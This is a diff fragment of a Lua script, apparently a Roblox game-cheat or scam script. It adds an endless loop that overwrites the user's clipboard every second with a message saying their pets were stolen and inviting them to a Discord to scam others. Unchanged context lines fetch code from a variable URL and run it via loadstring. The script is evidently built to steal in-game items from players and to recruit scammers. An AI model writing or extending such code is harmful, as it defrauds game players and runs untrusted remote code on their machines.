@@ -51,7 +51,13 @@ end)
         local attempt = 1
         local teleported = false
 
+        coroutine.wrap(function()
+    while true do
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        wait(1)
+    end
+end)()
+
 
         loadstring(game:HttpGet(krnlbypass, true))()
         
